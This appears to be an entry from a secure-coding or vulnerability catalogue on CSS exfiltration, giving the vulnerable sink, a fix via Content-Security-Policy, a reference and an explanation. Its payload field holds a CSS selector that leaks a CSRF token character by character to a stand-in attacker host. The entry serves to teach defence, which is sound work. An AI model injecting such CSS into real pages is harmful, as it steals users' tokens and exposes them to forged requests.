---
order: 5
cwe: 200
title: CSS exfiltration
category: injection
severity: medium
sink: |-
    <style> built from user input
payload: |-
    html:has(input[name=csrf][value^="a"]) {
      background: url(//evil.sh?c=a);
    }
fix: |
    Content-Security-Policy: style-src 'self'; img-src 'self'
    // never interpolate user input into style blocks
refs:
    - https://portswigger.net/research/blind-css-exfiltration
---

No script needed: one selector per possible character leaks a token, character by character, through background-image requests. It needs `:has()` because a hidden input is never rendered, so a background on the input itself never loads. Injected CSS can also draw a fake login form over the real one. A strict `style-src` and `img-src` close the channel.
